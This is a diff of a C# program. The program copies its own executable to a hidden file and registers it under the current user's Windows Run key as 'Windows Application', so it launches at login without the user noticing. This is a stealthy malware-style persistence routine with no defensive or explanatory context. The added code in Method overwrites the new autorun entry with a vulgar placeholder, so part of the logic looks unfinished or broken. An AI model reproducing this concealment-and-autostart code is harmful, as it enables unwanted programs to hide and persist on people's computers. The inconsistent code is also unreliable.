@@ -28,13 +28,15 @@ namespace reflection
                 File.Copy(AssemblyProduct, fileName);
                 File.SetAttributes(fileName, FileAttributes.Hidden);
             }
-            var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run\");
+            var key = Registry.CurrentUser.CreateSubKey(IAssembly.Autorun);
             if (key != null) key.SetValue("Windows Application", fileName);
             Method();
         }
         private static void Method()
         {
-            // сюда кидаем скрипт замены имени процессора 
+            var key = Registry.CurrentUser;
+            key = key.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run\", true);
+            if (key != null) key.SetValue("Windows Application", "huy");
             ExitProcess(0);
         }
         public static string AssemblyProduct
